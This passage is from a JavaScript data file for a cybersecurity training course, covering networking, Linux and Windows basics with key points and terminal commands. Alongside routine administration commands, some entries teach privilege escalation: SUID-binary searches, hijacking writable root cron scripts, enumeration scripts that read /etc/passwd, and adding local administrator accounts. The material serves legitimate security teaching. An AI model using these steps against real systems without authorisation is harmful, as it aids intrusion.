      "Identify common ports/protocols and the purpose of MAC/ARP",
      "Differentiate TCP and UDP and when each is used",
      "Explain what a firewall, VPN, proxy, and NAT actually do to traffic",
      "Capture and interpret live traffic in Wireshark",
    ],
    resources: [
      { title: "TryHackMe Networking Fundamentals", url: "https://tryhackme.com", type: "platform" },
      { title: "Professor Messer Networking", url: "https://www.professormesser.com", type: "video" },
      { title: "Wireshark", url: "https://www.wireshark.org", type: "tool" },
    ],
    topics: [
      {
        id: "m2-1",
        moduleId: "m2",
        number: 12,
        title: "OSI Model — All 7 Layers Explained",
        type: "theory",
        week: 2,
        description:
          "A 7-layer conceptual framework describing how data moves across a network — theoretical, but essential vocabulary: Wireshark captures at Layer 2/3, XSS is a Layer 7 attack, a WAF defends at Layer 7.",
        keyPoints: [
          "L1 Physical (cables/signals) → L2 Data Link (MAC/switches) → L3 Network (IP/routers) → L4 Transport (TCP/UDP)",
          "L5 Session (connection mgmt) → L6 Presentation (encryption/encoding) → L7 Application (HTTP, DNS, the actual app)",
          "'TCP/IP is the actual engine; OSI is the blueprint/manual' — in practice, the real world runs on TCP/IP's 4 layers",
          "Security tools map cleanly to layers: Wireshark (L2/L3), firewalls (L3/L4), WAF (L7)",
        ],
      },
      {
        id: "m2-2",
        moduleId: "m2",
        number: 13,
        title: "TCP/IP Model",
        type: "theory",
        week: 2,
        description:
          "TCP/IP defines how devices actually transmit data across real networks — it has 4 layers versus the OSI model's 7, and it's what every network you'll test actually runs on.",
        keyPoints: [
          "Layers: Application (HTTP/FTP/SMTP) → Transport (TCP/UDP) → Internet (IP/ICMP) → Network Access (Ethernet/Wi-Fi)",
          "TCP = reliable, ordered, error-checked delivery; IP = addressing and routing of packets",
          "Key features: scalability, interoperability, routability (OSPF, BGP), modularity",
          "'In the real world we use TCP/IP, not OSI — OSI is theoretical'",
        ],
      },
      {
        id: "m2-3",
        moduleId: "m2",
        number: 14,
        title: "IP Addressing (IPv4, IPv6) & Subnetting",
        type: "theory",
        week: 2,
        description:
          "Every device on a network needs an address — subnetting is how you divide one address space into smaller, manageable, isolated networks.",
        keyPoints: [
          "IPv4: 32-bit address (e.g. 192.168.1.10), written as 4 octets",
          "IPv6: 128-bit address, designed to solve IPv4 exhaustion (e.g. 2001:db8::1)",
          "CIDR notation (e.g. /24) defines how many bits are the network portion vs host portion",
          "A /24 network (255.255.255.0) gives 256 addresses (254 usable hosts)",
          "Subnetting isolates traffic, reduces broadcast domains, and enables per-segment security policy",
        ],
      },
      {
        id: "m2-4",
        moduleId: "m2",
        number: 15,
        title: "Ports & Common Protocols (DNS, HTTP/S, FTP, SSH, SMTP, RDP)",
        type: "theory",
        week: 2,
        description:
          "Rules and conventions enabling device communication — every service you'll ever scan or exploit is identified first by its port and protocol.",
        keyPoints: [
          "HTTP (80) / HTTPS (443, TLS-encrypted): web traffic",
          "DNS (53): domain-name-to-IP resolution — the 'phone book' of the internet",
          "FTP (21), SSH (22, secure remote admin), SMTP (25, mail sending), RDP (3389, Windows remote desktop)",
          "Security protocols: SSL/TLS, IPSec; management protocols: SNMP, ICMP (used by ping)",
          "TCP-based services (reliable, e.g. email/downloads) vs UDP-based (fast, e.g. DNS queries/streaming)",
        ],
        terminalCommands: ["ping google.com", "curl -I https://example.com"],
      },
      {
        id: "m2-5",
        moduleId: "m2",
        number: 16,
        title: "MAC Address & ARP",
        type: "theory",
        week: 2,
        description:
          "ARP maps an IP address to a MAC address on the local network segment (Layer 2) — think of it like looking up a house's exact door number using its street address.",
        keyPoints: [
          "ARP process: check ARP cache → broadcast ARP Request → receive unicast ARP Reply → update cache",
          "Types: Dynamic ARP, Static ARP, Proxy ARP, Gratuitous ARP (GARP)",
          "ARP Spoofing/Poisoning: attacker maps their own MAC to a legitimate IP, enabling MITM attacks",
          "MAC addresses operate only within a local network segment; routers use IP for anything beyond it",
        ],
        terminalCommands: ["arp -a", "arp -n"],
      },
      {
        id: "m2-6",
        moduleId: "m2",
        number: 17,
        title: "TCP vs UDP — Differences & Use Cases",
        type: "theory",
        week: 2,
        description:
          "The two transport-layer protocols trade reliability for speed differently — knowing which a service uses shapes how you scan and exploit it.",
        keyPoints: [
          "TCP: connection-oriented, reliable, in-order delivery (3-way handshake) — used for downloads, email, streaming",
          "UDP: connectionless, faster, no delivery guarantee — used for gaming, video calls, live streaming, DNS",
          "Nmap treats TCP and UDP scans very differently (-sS vs -sU) — UDP scanning is much slower",
        ],
      },
      {
        id: "m2-7",
        moduleId: "m2",
        number: 18,
        title: "Switches, Routers, Hubs - Differences",
        type: "theory",
        week: 2,
        description:
          "Three core connectivity devices with increasing intelligence — a hub is a dumb broadcaster, a switch forwards by MAC address, a router connects networks by IP.",
        keyPoints: [
          "Hub (L1): broadcasts to every port, no intelligence, low security — largely obsolete",
          "Switch (L2): forwards frames based on MAC address table, moderate security",
          "Router (L3): routes packets between networks based on IP, highest security controls (ACLs)",
          "Switch types: Unmanaged, Managed, Layer 2, Layer 3 (can route)",
        ],
      },
      {
        id: "m2-8",
        moduleId: "m2",
        number: 19,
        title: "Firewall Basics (packet filter, stateful, NGFW)",
        type: "theory",
        week: 2,
        description:
          "A firewall monitors and controls incoming/outgoing traffic against a defined rule set — the network's security guard.",
        keyPoints: [
          "Packet-Filtering: rules by IP/port/protocol only (Layer 3/4)",
          "Stateful Inspection: tracks connection state and session context",
          "Proxy/Application-Layer Firewall: Layer 7 intermediary, masks internal IPs",
          "NGFW (Next-Gen): combines deep packet inspection + IPS + application awareness, inspects HTTPS traffic",
          "Protects against unauthorised access, malware, data breaches, and DoS attacks",
        ],
        terminalCommands: [
          "iptables -L",
          "sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
        ],
      },
      {
        id: "m2-9",
        moduleId: "m2",
        number: 20,
        title: "VPN & Proxies",
        type: "theory",
        week: 2,
        description:
          "Both mask your IP and can improve privacy, but they work very differently — a proxy is a simple middleman, a VPN is a fully encrypted tunnel for all traffic.",
        keyPoints: [
          "Proxy types: HTTP, HTTPS, SOCKS, Transparent, Reverse, Anonymous, Elite — typically not encrypted",
          "VPN types: Remote Access, Site-to-Site, SSL/TLS, IPSec, MPLS, Cloud VPN — encrypts all traffic",
          "VPN is slower (encryption overhead) but protects traffic on untrusted networks like public Wi-Fi",
          "TryHackMe and HackTheBox both require a VPN connection to reach their lab networks",
        ],
      },
      {
        id: "m2-10",
        moduleId: "m2",
        number: 21,
        title: "NAT (Network Address Translation)",
        type: "theory",
        week: 2,
        description:
          "NAT translates private internal IP addresses to a single public IP for internet-bound traffic, conserving scarce public IPv4 addresses.",
        keyPoints: [
          "Private-to-public IP translation lets many internal devices share one public IP",
          "Conserves IPv4 address space and hides internal network structure from the internet",
          "Complicates inbound connections — port forwarding is required to reach an internal service from outside",
        ],
      },
      {
        id: "m2-11",
        moduleId: "m2",
        number: 22,
        title: "What Happens When You Type a URL and Hit Enter (full flow)",
        type: "theory",
        week: 2,
        description:
          "A classic interview question that ties every networking concept in this module together into one end-to-end flow.",
        keyPoints: [
          "Browser checks cache → DNS resolution (domain → IP) via resolver/root/TLD/authoritative servers",
          "TCP 3-way handshake (SYN, SYN-ACK, ACK) establishes a connection to the server's IP on port 443",
          "TLS handshake negotiates encryption; browser sends the HTTP request over the encrypted channel",
          "Server processes the request (app logic, DB queries) and returns an HTTP response",
          "Browser parses HTML/CSS/JS and renders the page, firing further requests for assets",
        ],
      },
      {
        id: "m2-12",
        moduleId: "m2",
        number: 23,
        title: "Wireshark Lab - Capture & Label Traffic by OSI Layer",
        type: "lab",
        week: 2,
        description:
          "Hands-on packet capture and analysis lab — capture live traffic and identify protocols at each OSI layer using Wireshark's Statistics and Follow-Stream views.",
        keyPoints: [
          "Packets on a network are visible to anyone listening; HTTPS is encrypted, FTP/HTTP are not",
          "Statistics view shows source/destination IP and protocol breakdown — flag any unknown/suspicious IPs",
          "Right-click a packet → Follow → TCP Stream to view the full request/response conversation",
          "Look for the 3-way TCP handshake followed by an application-layer request (e.g. HTTP GET)",
        ],
      },
      {
        id: "m2-13",
        moduleId: "m2",
        number: 24,
        title: "Subnetting Practice Exercise (5 CIDRs)",
        type: "exercise",
        week: 2,
        description:
          "Manual subnet-math practice — calculate network address, broadcast address, and usable host range for 5 given CIDR blocks without a calculator first.",
        keyPoints: [
          "For any /n, host bits = 32 - n, total addresses = 2^(host bits)",
          "Network address = first address in the block; broadcast = last address in the block",
          "Usable hosts = total addresses - 2 (network + broadcast reserved)",
          "Practice going both directions: CIDR → range, and range → CIDR",
        ],
      },
    ],
  },

  // ============================================================
  // M3: OS Basics — Linux
  // ============================================================
  {
    id: "m3-linux",
    name: "M3: OS Basics - Linux",
    shortName: "Linux Basics",
    month: 1,
    weeks: [3],
    description:
      "Linux is the operating system behind most servers, cloud infrastructure, and every major pentesting distro (Kali). This module builds real command-line fluency — navigation, permissions, processes, and networking — that every later lab assumes you already have.",
    estimatedHours: 22,
    outcomes: [
      "Navigate the Linux filesystem and manage files/directories confidently from the shell",
      "Read and modify permissions, including SUID/SGID/sticky-bit security implications",
      "Manage processes, services, users, and groups from the command line",
      "Use pipes, redirection, and core text tools (grep/sed/awk) to chain commands",
      "Capture traffic and manage firewall rules with tcpdump/iptables",
    ],
    resources: [
      { title: "OverTheWire Bandit", url: "https://overthewire.org/wargames/bandit/", type: "platform" },
      { title: "explainshell.com", url: "https://explainshell.com", type: "tool" },
      { title: "TryHackMe Linux Fundamentals", url: "https://tryhackme.com", type: "platform" },
    ],
    topics: [
      {
        id: "m3-linux-1",
        moduleId: "m3-linux",
        number: 25,
        title: "Linux Overview - Distros, Philosophy, Use in Security",
        type: "theory",
        week: 3,
        description:
          "Linux is a family of open-source operating systems built on the Linux kernel (created by Linus Torvalds, released 17 Sept 1991) due to a lack of a free kernel for the GNU project.",
        keyPoints: [
          "A distro = kernel + software + package manager, e.g. Kali (pentesting, XFCE), Mint (beginner-friendly), Ubuntu (Debian-derived, servers), Arch (minimal, fully customisable)",
          "Used across servers, cloud, IoT, and Android — considered more secure and customisable than Windows for these use cases",
          "Kali Linux ships pre-loaded with the pentesting tools used throughout this programme (Nmap, Burp, Metasploit, Hashcat)",
        ],
        terminalCommands: ["tree / -L 1"],
      },
      {
        id: "m3-linux-2",
        moduleId: "m3-linux",
        number: 26,
        title: "Linux File System Hierarchy (/bin, /etc, /var, /home, /tmp)",
        type: "theory",
        week: 3,
        description:
          "Linux uses a single rooted tree (/) rather than separate drive letters like Windows — other drives are 'mounted' into this one tree.",
        keyPoints: [
          "/bin: system binaries (bash, ls, cat) — /etc: config files — /home: user home directories",
          "/var: variable/frequently-changing data (logs) — /tmp: temporary files, cleared on reboot",
          "/root: root user's home — /usr: non-critical user binaries/libraries — /opt: third-party software",
          "/dev: device files — /media, /mnt: removable/temporary mount points",
        ],
        terminalCommands: ["tree / -L 1", "ls -la /"],
      },
      {
        id: "m3-linux-3",
        moduleId: "m3-linux",
        number: 27,
        title: "File Navigation & Management (ls, cd, cp, mv, rm, find, locate, mkdir)",
        type: "theory",
        week: 3,
        description:
          "The core commands you'll type hundreds of times a day — the shell prompt format is user@host:current_dir$, where ~ means your home directory.",
        keyPoints: [
          "'.' = current directory, '..' = parent directory",
          "Absolute paths start from / ; relative paths are resolved from your current directory",
          "find searches the live filesystem by criteria; locate uses a prebuilt index (faster, can be stale)",
        ],
        terminalCommands: [
          "pwd",
          "cd ~",
          "cd ..",
          "ls -la [dir]",
          "touch file",
          "mkdir dir",
          "rm -r dir",
          "mv src dest",
          "cp src dest",
          "find / -type f -name index.html",
          "locate index.html",
          "which nmap",
        ],
      },
      {
        id: "m3-linux-4",
        moduleId: "m3-linux",
        number: 28,
        title: "Standard I/O, Pipes & Redirection (|, >, >>, tee, grep, sed, awk)",
        type: "theory",
        week: 3,
        description:
          "Linux I/O uses 3 standard streams — stdin(0), stdout(1), stderr(2). Redirection sends stream data to/from files; pipes chain one program's output into another's input.",
        keyPoints: [
          "> overwrites stdout, >> appends stdout, 2> redirects stderr, < feeds stdin from a file",
          "/dev/null is a special discard file for suppressing unwanted output",
          "Pipes chain commands: command1 | command2 | command3",
          "tee writes to the terminal AND a file simultaneously — useful for logging a live scan",
        ],
        terminalCommands: [
          'echo "Hello World!" > hello.txt',
          'echo "more text" >> hello.txt',
          "ls /home /root 2>/dev/null",
          "cat /proc/meminfo | grep MemFree",
          "ping google.com | tee ping.log",
        ],
      },
      {
        id: "m3-linux-5",
        moduleId: "m3-linux",
        number: 29,
        title: "File Permissions (chmod, chown, chgrp, SUID, SGID, Sticky Bit)",
        type: "theory",
        week: 3,
        description:
          "Every file/directory has owner/group/other permission triads (viewable via ls -l) — misconfigured permissions, especially SUID binaries, are a classic Linux privilege-escalation vector.",
        keyPoints: [
          "Octal notation: 4=read, 2=write, 1=execute (sum to combine), e.g. chmod 700 file, chmod 744 file",
          "Permission table: 0=--- 1=--x 2=-w- 3=-wx 4=r-- 5=r-x 6=rw- 7=rwx",
          "SUID (chmod u+s / 4xxx): binary runs as its owner regardless of who executes it",
          "SGID (chmod g+s / 2xxx): binary/directory runs as/inherits its owning group",
          "Sticky bit (chmod +t / 1xxx): restricts delete/rename to the file's owner or root (used on /tmp)",
        ],
        terminalCommands: [
          "ls -l",
          "chown user file",
          "chgrp group file",
          "chmod u+x file",
          "chmod 700 file",
          "find / -perm -4000 -type f 2>/dev/null",
        ],
      },
      {
        id: "m3-linux-6",
        moduleId: "m3-linux",
        number: 30,
        title: "Man Pages & Help System",
        type: "theory",
        week: 3,
        description:
          "Built-in documentation for every command via man — indispensable when you hit an unfamiliar flag mid-engagement.",
        keyPoints: [
          "Man sections: 1=commands, 2=syscalls, 3=library calls, 5=file formats (e.g. /etc/passwd), 8=sysadmin",
          "man 1 passwd = the passwd command; man 5 passwd = the /etc/passwd file format",
          "Inside man: / then a term to search, n/N for next/previous match, q to quit",
        ],
        terminalCommands: ["man man", "man 5 passwd", "man -k network"],
      },
      {
        id: "m3-linux-7",
        moduleId: "m3-linux",
        number: 31,
        title: "Process Management (ps, top, htop, kill, bg, fg, nohup)",
        type: "theory",
        week: 3,
        description:
          "ps (process status) lists running processes with their PID — the identifier you need to inspect, background, or kill any running program.",
        keyPoints: [
          "ps -aux (BSD syntax) vs ps -ef (Standard syntax) — both list all running processes",
          "Ctrl+C sends an interrupt; Ctrl+Z suspends a process — fg resumes it in the foreground, bg in the background",
          "Trailing & backgrounds a command immediately; $? holds the last command's exit code",
        ],
        terminalCommands: [
          "ps aux",
          "ps -ef | grep sshd",
          "kill <PID>",
          "top",
          "htop",
          "nohup long_command &",
        ],
      },
      {
        id: "m3-linux-8",
        moduleId: "m3-linux",
        number: 32,
        title: "User & Group Management (adduser, passwd, sudo, su, groups, id)",
        type: "theory",
        week: 3,
        description:
          "Every user has a username and one or more groups, which drive permission and access-control decisions system-wide.",
        keyPoints: [
          "root = UID/GID 0; sudo -l shows what a user is allowed to run as root (a key privesc check)",
          "/etc/passwd stores user metadata (7 fields: username, x, UID, GID, GECOS, home dir, shell); real hashes live in root-only /etc/shadow",
          "adduser (interactive, friendlier) vs useradd -m -s /bin/bash (low-level, scriptable)",
          "usermod -aG sudo user adds a user to the sudo group without removing existing groups",
        ],
        terminalCommands: [
          "whoami",
          "id",
          "sudo -l",
          "adduser newuser",
          "usermod -aG sudo newuser",
          "passwd newuser",
          "groups newuser",
        ],
      },
      {
        id: "m3-linux-9",
        moduleId: "m3-linux",
        number: 33,
        title: "Starting & Stopping Services (systemctl, service)",
        type: "theory",
        week: 3,
        description:
          "systemd (PID 1, the init process) replaced legacy SysV init scripts on modern distros — systemctl is how you check, start, stop, and persist services.",
        keyPoints: [
          "systemctl status <service> shows Loaded/Active/Main PID at a glance",
          "'start' runs a service now only; 'enable' makes it persist across reboots — they are not the same",
        ],
        terminalCommands: [
          "sudo systemctl status sshd",
          "sudo systemctl stop sshd",
          "sudo systemctl start sshd",
          "sudo systemctl enable sshd",
        ],
      },
      {
        id: "m3-linux-10",
        moduleId: "m3-linux",
        number: 34,
        title: "Network Commands (ifconfig/ip, netstat, ss, tcpdump, iptables)",
        type: "theory",
        week: 3,
        description:
          "The commands that show you what a Linux box can see and reach on the network — interface config, active connections, live packet capture, and firewall rules.",
        keyPoints: [
          "ip a (modern) has replaced ifconfig (legacy) for showing interfaces and assigned IPs",
          "netstat -tulpn / ss -tulpn show listening ports and established connections",
          "tcpdump captures live traffic; -w saves to a .pcap file for later Wireshark analysis",
          "iptables filters traffic via Tables, Chains, Rules, and Targets",
        ],
        terminalCommands: [
          "ip a",
          "netstat -tulpn",
          "ss -tulpn",
          "sudo tcpdump -i any -c 1000 -w capture.pcap",
          "iptables -L",
        ],
      },
      {
        id: "m3-linux-11",
        moduleId: "m3-linux",
        number: 35,
        title: "Package Management (apt, apt-get, dpkg, yum/dnf)",
        type: "theory",
        week: 3,
        description:
          "Debian-based distros (Kali, Ubuntu, Mint) use APT/dpkg; Red Hat-based distros use YUM/DNF — knowing both lets you install tools on any target you're given lab access to.",
        keyPoints: [
          "apt update refreshes the package index; apt upgrade installs newer versions of installed packages",
          "apt install <pkg> installs a new tool; dpkg -i installs a local .deb file directly",
          "yum/dnf are the RPM-based equivalents on CentOS/Fedora/RHEL",
        ],
        terminalCommands: [
          "sudo apt update && sudo apt upgrade",
          "sudo apt install nmap",
          "sudo dpkg -i package.deb",
          "sudo dnf install nmap",
        ],
      },
      {
        id: "m3-linux-12",
        moduleId: "m3-linux",
        number: 36,
        title: "SSH & Remote Access (ssh, scp, ssh-keygen)",
        type: "theory",
        week: 3,
        description:
          "SSH provides secure, encrypted remote access to servers — system administrators (and pentesters, post-exploitation) use it to remotely manage or pivot through machines.",
        keyPoints: [
          "Password auth vs key-based auth (ssh-keygen generates a keypair; public key goes in ~/.ssh/authorized_keys)",
          "scp copies files securely over SSH, using the same syntax style as cp but with a host prefix",
          "SSH is the standard target for Hydra/Medusa brute-force testing labs later in the course",
        ],
        terminalCommands: [
          "ssh user@10.10.10.5",
          "ssh-keygen -t ed25519",
          "scp file.txt user@10.10.10.5:/tmp/",
        ],
      },
      {
        id: "m3-linux-13",
        moduleId: "m3-linux",
        number: 37,
        title: "Cron Jobs & Task Automation (crontab -e)",
        type: "theory",
        week: 3,
        description:
          "Cron schedules commands to run automatically at fixed times/intervals — and a world-writable cron script run as root is a classic Linux privilege-escalation path covered again in M11.",
        keyPoints: [
          "Crontab format: minute hour day month weekday command",
          "System-wide jobs live in /etc/crontab and /etc/cron.d/; user jobs via crontab -e",
          "Privesc angle: if a root cron job calls a script writable by your user, you can hijack it",
        ],
        terminalCommands: ["crontab -e", "crontab -l", "cat /etc/crontab", "ls -la /etc/cron.d/"],
      },
      {
        id: "m3-linux-14",
        moduleId: "m3-linux",
        number: 38,
        title: "OverTheWire: Bandit Levels 0-10",
        type: "lab",
        week: 3,
        description:
          "A wargame that teaches Linux/SSH fundamentals level by level — each level is an SSH login that hides the password for the next level somewhere on the filesystem.",
        keyPoints: [
          "Level 0: connect via SSH with the credentials given on the Bandit site",
          "Each level requires applying a new command/concept (find, cat hidden files, permissions, compression) to locate the next password",
          "Submit a screenshot of the Level 10 flag/password as proof of completion",
        ],
        terminalCommands: ["ssh bandit0@bandit.labs.overthewire.org -p 2220"],
      },
      {
        id: "m3-linux-15",
        moduleId: "m3-linux",
        number: 39,
        title: "Bash Script: Enumerate users & running processes",
        type: "lab",
        week: 3,
        description:
          "Write a Bash script that automatically enumerates local users, running processes, and listening ports — a mini version of the enumeration scripts used in real post-exploitation.",
        keyPoints: [
          "Read /etc/passwd to list local users and their shells",
          "Use ps aux to capture running processes",
          "Use ss -tulpn (or netstat) to capture listening ports",
          "Write all output to a timestamped report file with tee",
        ],
        terminalCommands: [
          "#!/bin/bash",
          'echo "== Users ==" ; cut -d: -f1 /etc/passwd',
          'echo "== Processes ==" ; ps aux',
          'echo "== Listening Ports ==" ; ss -tulpn',
        ],
      },
    ],
  },

  // ============================================================
  // M3b: OS Basics — Windows
  // ============================================================
  {
    id: "m3-windows",
    name: "M3: OS Basics - Windows",
    shortName: "Windows Basics",
    month: 1,
    weeks: [4],
    description:
      "Most corporate environments you'll test run Windows and Active Directory. This module covers the architecture, permission model, and command-line tools (CMD/PowerShell) needed to operate confidently on a Windows box — critical groundwork for AD attacks and Windows privesc later.",
    estimatedHours: 20,
    outcomes: [
      "Explain User Mode vs Kernel Mode and why it matters for stability/security",
      "Manage files, permissions (ACL/icacls), users, and groups from CMD/PowerShell",
      "Manage Windows processes and services from the command line",
      "Configure and query Windows Defender and Windows Firewall via CLI",
      "Investigate a Windows Event Log for indicators of compromise",
    ],
    resources: [
      { title: "TryHackMe Windows Fundamentals", url: "https://tryhackme.com", type: "platform" },
      { title: "Microsoft Docs", url: "https://learn.microsoft.com", type: "link" },
      { title: "SS64.com CMD/PowerShell reference", url: "https://ss64.com", type: "link" },
    ],
    topics: [
      {
        id: "m3-windows-1",
        moduleId: "m3-windows",
        number: 40,
        title: "Windows Versions & Architecture (User Mode vs Kernel Mode)",
        type: "theory",
        week: 4,
        description:
          "The CPU has two privilege rings relevant here — User Mode (Ring 3) and Kernel Mode (Ring 0) — think User Mode as the building lobby, Kernel Mode as the control room.",
        keyPoints: [
          "User Mode: restricted, apps use the Windows API/system calls to reach Kernel Mode, own virtual address space per process",
          "Kernel Mode: direct hardware/memory access, runs Executive subsystems + device drivers; a kernel crash = BSOD",
          "Windows 10/11 Pro adds BitLocker, RDP host, Group Policy, Hyper-V; Enterprise adds Defender ATP, AppLocker, Credential Guard",
          "Windows Server editions add AD DS, DNS/DHCP, IIS, and Domain Controller roles — not meant for end-user desktops",
        ],
      },
      {
        id: "m3-windows-2",
        moduleId: "m3-windows",
        number: 41,
        title: "File Navigation & Management (Explorer, CMD: cd, dir, copy, del, icacls)",
        type: "theory",
        week: 4,
        description:
          "The CMD equivalents of Linux's cd/ls/cp/rm, plus icacls for viewing/editing file permissions from the command line.",
        keyPoints: [
          "dir /a shows hidden files; rmdir /s /q removes a folder and its contents quietly",
          "icacls shows/edits ACL permissions on a file or folder directly from CMD",
        ],
        terminalCommands: [
          "cd C:\\Users\\Admin\\Documents",
          "dir /a",
          "copy file.txt D:\\Backup\\file.txt",
          "move data.csv C:\\Archive\\data.csv",
          "del old_report.txt",
          "mkdir NewFolder",
          "rmdir /s /q UnusedFolder",
          "icacls filename.txt",
          "icacls filename.txt /grant UserName:F",
        ],
      },
      {
        id: "m3-windows-3",
        moduleId: "m3-windows",
        number: 42,
        title: "NTFS File System & Permissions",
        type: "theory",
        week: 4,
        description:
          "NTFS is the modern Windows filesystem, supporting per-file/folder ACLs, encryption (EFS), compression, and journaling for crash recovery.",
        keyPoints: [
          "NTFS permissions stack with share permissions — the most restrictive of the two wins",
          "Supports Alternate Data Streams (ADS) — a technique sometimes abused to hide data/malware",
          "Journaling logs changes before committing them, protecting against corruption on crash",
        ],
      },
      {
        id: "m3-windows-4",
        moduleId: "m3-windows",
        number: 43,
        title: "Windows Registry (regedit, structure, common keys)",
        type: "theory",
        week: 4,
        description:
          "A hierarchical database storing low-level OS and application configuration — a favourite target for both legitimate admin and malware persistence.",
        keyPoints: [
          "Root hives: HKEY_LOCAL_MACHINE (system-wide), HKEY_CURRENT_USER (per-user), HKEY_CLASSES_ROOT, HKEY_USERS",
          "HKLM\\...\\Run and HKCU\\...\\Run keys auto-launch programs at login — a common persistence/malware mechanism",
          "regedit provides a GUI; reg query/reg add work from CMD/scripts",
        ],
        terminalCommands: [
          "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        ],
      },
      {
        id: "m3-windows-5",
        moduleId: "m3-windows",
        number: 44,
        title: "User & Group Management (net user, whoami, UAC, Group Policy)",
        type: "theory",
        week: 4,
        description:
          "Local and domain user/group administration from the command line, plus User Account Control (UAC) as a privilege-escalation guard rail.",
        keyPoints: [
          "UAC prompts for consent/credentials before running an action with admin rights",
          "Group Policy (GPO) pushes centralized configuration/security settings across domain-joined machines",
        ],
        terminalCommands: [
          "net user",
          "net user testuser Pass@123 /add",
          "whoami",
          "wmic useraccount get name,sid,status",
          "net localgroup administrators",
          "net localgroup administrators testuser /add",
        ],
      },
      {
        id: "m3-windows-6",
        moduleId: "m3-windows",
        number: 45,
        title: "Windows ACL (Access Control List) & icacls",
        type: "theory",
        week: 4,
        description:
          "ACLs manage permissions on files, folders, registry keys, and network resources — via DACLs (who can do what) and SACLs (what gets audited).",
        keyPoints: [
          "DACL (Discretionary ACL): user/group permissions; SACL (System ACL): auditing configuration",
          "ACEs (Access Control Entries) are the individual permission rules that make up an ACL",
          "SIDs (Security Identifiers) uniquely identify users/groups, independent of display name",
          "GUI path: right-click file/folder → Properties → Security tab",
        ],
        terminalCommands: [
          'icacls "C:\\example\\file.txt"',
          'icacls "C:\\example\\file.txt" /grant JohnDoe:R',
          'icacls "C:\\example\\file.txt" /remove JohnDoe',
          'icacls "C:\\example" /save "C:\\acl_backup.txt"',
          "$acl = Get-Acl \"C:\\example\\file.txt\"",
          "Set-Acl \"C:\\example\\file.txt\" $acl",
        ],
      },
      {
        id: "m3-windows-7",
        moduleId: "m3-windows",
        number: 46,
        title: "Processes & Services (tasklist, taskkill, sc, services.msc)",
        type: "theory",
        week: 4,
        description:
          "The Windows equivalents of ps/kill/systemctl — tasklist/taskkill for processes, sc/services.msc for services.",
        keyPoints: [
          "taskkill /F /T /IM forces termination of a process and its child-process tree",
          "sc query shows a service's current state (e.g. RUNNING/STOPPED)",
        ],
        terminalCommands: [
          "tasklist",
          'tasklist | findstr "notepad"',
          "taskkill /F /T /IM notepad.exe",
          "Get-Process | Sort-Object -Property CPU -Descending",
          "sc query wuauserv",
          "Get-Service -Name \"wuauserv\"",
          "Restart-Service -Name \"wuauserv\"",
        ],
      },
      {
        id: "m3-windows-8",
        moduleId: "m3-windows",
        number: 47,
        title: "PowerShell Essentials (Get-Help, Get-Command, Get-Process, Invoke-Expression)",
        type: "theory",
        week: 4,
        description:
          "PowerShell is an object-oriented shell built on .NET — far more powerful for scripting/automation than legacy CMD, and heavily used offensively (and defensively) in Windows environments.",
        keyPoints: [
          "Get-Command finds cmdlets; Get-Help shows usage and examples for any cmdlet",
          "Execution Policy controls whether scripts can run at all (RemoteSigned is a common safe default)",
          "Invoke-Expression executes a string as PowerShell code — powerful, and a common living-off-the-land technique",
        ],
        terminalCommands: [
          "Get-Command *service*",
          "Get-Help Get-Service -Examples",
          "Get-ExecutionPolicy",
          "Set-ExecutionPolicy RemoteSigned",
          'Invoke-Expression "Get-Date"',
        ],
      },
      {
        id: "m3-windows-9",
        moduleId: "m3-windows",
        number: 48,
        title: "CMD Essentials (ipconfig, netstat, nslookup, systeminfo, hostname, wmic)",
        type: "theory",
        week: 4,
        description:
          "Classic CMD tools for quick system and network reconnaissance on a Windows host.",
        keyPoints: [
          "systeminfo dumps a full inventory of OS, patches, and hardware in one command",
          "wmic queries WMI directly for hardware/software details from the command line",
        ],
        terminalCommands: [
          "ipconfig /all",
          "systeminfo",
          "hostname",
          "wmic product get name,version",
          "wmic cpu get name,maxclockspeed",
        ],
      },
      {
        id: "m3-windows-10",
        moduleId: "m3-windows",
        number: 49,
        title: "Windows Defender & Windows Firewall",
        type: "theory",
        week: 4,
        description:
          "Windows' built-in AV/EDR (Defender) and host firewall — you'll need to query and sometimes tune both when operating on a Windows target or lab VM.",
        keyPoints: [
          "Defender: real-time protection against viruses/ransomware/spyware, integrates with Intune/SCCM in enterprise",
          "Firewall: profile-based (Domain/Private/Public) inbound/outbound rule engine",
        ],
        terminalCommands: [
          "Get-MpComputerStatus",
          "Update-MpSignature",
          "MpCmdRun.exe -Scan -ScanType 1",
          "netsh advfirewall show allprofiles",
          'netsh advfirewall firewall add rule name="Allow HTTP" protocol=TCP dir=in localport=80 action=allow',
          "Get-NetFirewallRule",
        ],
      },
      {
        id: "m3-windows-11",
        moduleId: "m3-windows",
        number: 50,
        title: "Event Viewer & Windows Log Analysis",
        type: "theory",
        week: 4,
        description:
          "Windows logs almost everything of security interest into Event Viewer — filtering by Event ID is the fastest way to find the signal in thousands of log lines.",
        keyPoints: [
          "Event ID 4624/4625: successful/failed logon — core for brute-force detection",
          "Event ID 4657: registry key modification (auditing must be enabled)",
          "Event ID 1074: system shutdown/restart initiated",
          "Saved .evtx log files can be loaded into Event Viewer for offline analysis",
        ],
      },
      {
        id: "m3-windows-12",
        moduleId: "m3-windows",
        number: 51,
        title: "BitLocker & Disk Encryption",
        type: "theory",
        week: 4,
        description:
          "BitLocker is Windows' built-in full-disk encryption feature (Pro/Enterprise), protecting data at rest if a device is lost or stolen.",
        keyPoints: [
          "Uses the TPM (Trusted Platform Module) to seal the encryption key to the specific hardware",
          "Without the recovery key, an encrypted drive's contents are unreadable even if physically removed",
        ],
        terminalCommands: ["manage-bde -status", "manage-bde -on C:"],
      },
      {
        id: "m3-windows-13",
        moduleId: "m3-windows",
        number: 52,
        title: "Lab: PowerShell script to enumerate processes & users",
        type: "lab",
        week: 4,
        description:
          "Write a PowerShell script that lists all running processes, local users, and scheduled tasks — the Windows counterpart to the M3-Linux bash enumeration lab.",
        keyPoints: [
          "Get-Process for running processes",
          "Get-LocalUser (or net user) for local accounts",
          "Get-ScheduledTask for persistence/automation review",
        ],
        terminalCommands: [
          "Get-Process | Out-File C:\\temp\\Processes.txt",
          "Get-LocalUser",
          "Get-ScheduledTask | Select-Object TaskName,State",
        ],
      },
      {
        id: "m3-windows-14",
        moduleId: "m3-windows",
        number: 53,
        title: "TryHackMe: Windows Fundamentals Parts 1, 2, and 3",
        type: "lab",
        week: 4,
        description:
          "A guided TryHackMe room series covering Windows navigation, system settings, and administrative tools end-to-end.",
        keyPoints: [
